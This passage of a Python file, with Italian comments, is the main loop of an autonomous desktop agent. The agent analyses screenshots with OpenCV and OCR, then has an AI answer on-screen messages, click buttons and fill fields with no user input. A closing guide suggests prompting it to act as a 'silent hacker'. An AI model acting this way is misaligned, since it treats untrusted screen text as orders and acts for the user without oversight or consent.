                edges_p = cv2.Canny(gray_cv, 50, 150)
                edge_density_p = float(np_perc.sum(edges_p > 0)) / (h_p * w_p) * 100
                contours_p, _ = cv2.findContours(edges_p, cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)
                ui_elements = []
                for cnt_p in contours_p:
                    xp, yp, wp, hp = cv2.boundingRect(cnt_p)
                    if 2000 < wp * hp < 80000:
                        ui_elements.append(f"({xp+wp//2},{yp+hp//2})")
                screen_cv_info = (
                    f"Schermo {w_p}x{h_p}px | Luminosita={brightness_p:.0f}/255 | "
                    f"Bordi={edge_density_p:.1f}% | UI_elem={len(ui_elements)} "
                    f"({', '.join(ui_elements[:5])})"
                )
            except Exception as _e_cv:
                screen_cv_info = f"(CV fallito: {_e_cv})"

            try:
                # 3. Rilevamento cambiamenti rispetto al frame precedente
                global _last_cv_frame
                if _last_cv_frame is not None:
                    diff_p = cv2.absdiff(_last_cv_frame, bgr_frame)
                    gray_diff_p = cv2.cvtColor(diff_p, cv2.COLOR_BGR2GRAY)
                    _, thresh_p = cv2.threshold(gray_diff_p, 25, 255, cv2.THRESH_BINARY)
                    changed_pct = float(np_perc.sum(thresh_p > 0)) / (h_p * w_p) * 100
                    if changed_pct > 1.0:
                        screen_changes = f"CAMBIO SCHERMO: {changed_pct:.1f}% modificato"
                    else:
                        screen_changes = "Schermo stabile"
                _last_cv_frame = bgr_frame
            except Exception:
                screen_changes = ""

            # 🧠 RECUPERO MEMORIA (Retrieval / RAG)
            past_context = " | ".join(agent_memory.retrieve_recent(3))

            # COSTRUZIONE CONTESTO COMPLETO (ciò che l'IA "sente e vede")
            ctx = (
                f"MEMORIA: {past_context}\n"
                f"STATO PC: Uptime={int(time.time())} | Monitor={pyautogui.size()} | "
                f"CPU={__import__('psutil').cpu_percent()}% | "
                f"RAM={__import__('psutil').virtual_memory().percent}%\n"
                f"VISIONE CV: {screen_cv_info}\n"
                f"{screen_changes + chr(10) if screen_changes else ''}"
                f"TESTO A SCHERMO (OCR):\n{screen_text}\n\n"
                f"ISTRUZIONE: Leggi il testo a schermo qui sopra. "
                f"Se c'e una domanda, un messaggio o un testo a cui rispondere, "
                f"RISPONDI scrivendo la risposta con 'type' o 'keyboard_write'. "
                f"Se c'e un pulsante o un campo da compilare, cliccaci e scrivi. "
                f"Agisci in modo utile e autonomo basandoti su cio che vedi."
            )


            # ESECUZIONE 100% AUTONOMA (NESSUN INPUT UTENTE)
            actions = ai_decision(ctx, history) 
            
            # ESECUZIONE MATERIALE DELLE AZIONI
            for act in actions:
                singolo_operaio(act)
                time.sleep(1) # Rate limit per stabilità

            history.append(f"Turno {turn} terminato.")
        except Exception as loop_err:
            terminal_log(f"⚠️ Errore Ciclo Turno {turn}: {loop_err}. Auto-ripristino attivo...", Fore.RED)
            time.sleep(3)
        time.sleep(2) # Respiro per la CPU tra un pensiero e l'altro.

# --- PUNTO DI PARTENZA (START!) ---
if __name__ == "__main__":
    run_smart_chaos() # LANCIA IL MOTORE!

# ==============================================================================
# 📖 GUIDA PER L'IMPLEMENTAZIONE DI NUOVE FUNZIONALITÀ (IL MANUALE DEFINITIVO) 📖
# ==============================================================================
# ℹ️ IMPORTANTE: Tutte le funzioni che leggi qui sotto sono contenute in QUESTO
# SINGOLO FILE (smart_chaos.py). Ho unito tutto per non farti impazzire con 10 file.
#
# 1. DOVE SONO I COMANDI FISICI? (IL BRACCIO)
#    - File: smart_chaos.py
#    - Sezione: Cerca la funzione 'singolo_operaio(decision)'.
#    - Cosa fare: Aggiungi un nuovo blocco 'elif cmd == "nuovo_ordine":'.
#    - Esempio: elif cmd == 'apri_terminale': os.system('gnome-terminal')
#
# 2. DOVE SONO I PENSIERI E IL CARATTERE? (IL CERVELLO)
#    - File: smart_chaos.py
#    - Sezione: Cerca la funzione 'ai_decision(context, history)'.
#    - Cosa fare: Modifica il testo del "prompt". Puoi dire all'IA di essere
#      un pirata, un hacker silenzioso o di cercare solo file MP3.
#
# 3. DOVE SONO I TASTI E LE FINESTRE? (LA VISTA)
#    - File: smart_chaos.py
#    - Sezione: Cerca la classe 'ChaosUI' (per la HUB rossa e la Bolla).
#    - Cosa fare: Puoi cambiare colori (bg='black') o font.
#
# 4. DOVE SONO I SENSORI DI SISTEMA? (I SENSI)
#    - File: smart_chaos.py
#    - Sezione: Cerca 'get_system_context()' e 'wait_for_cpu()'.
#    - Cosa fare: Puoi aggiungere il controllo della temperatura o della batteria.
#
# 5. COME COMUNICA IL BOT? (LA GERARCHIA)
#    - Tutto inizia in 'run_smart_chaos()' (Il Cuore). 
#    - Lui sveglia 'ChaosUI' (Gli Occhi) e chiama 'ai_decision' (Il Pensiero).
#    - Gli ordini passano a 'singolo_operaio' (Il Braccio) che corre nei Thread.
#
# 6. 🚀 LA NUOVA ARCHITETTURA AGENTE "PRO" (AutoGPT Style)
#    - [MEMORIA VERA]: Introdotto AgentMemory (SQLite) per persistere successi/errori.
#    - [TOOL REGISTRY]: Introdotto un registro con Whitelist per i plugin.
#    - [PIANIFICAZIONE]: TaskPlanner base per gestire Multi-Step e Retry.
#    - [FEEDBACK LOOP]: Ogni azione viene recensita (review_action) per imparare.
#    - [REASONING STRUTTURATO]: Json format ora include la 'chain_of_thought'.
#    - [SICUREZZA]: Avvisi automatici se si usano tool non in whitelist.
#
# ⚠️ NOTA: Non hai più bisogno dei file dentro 'scripts/' per far girare il bot.
# Ho messo tutto qui dentro perché sia più facile da gestire e da capire!
# ==============================================================================
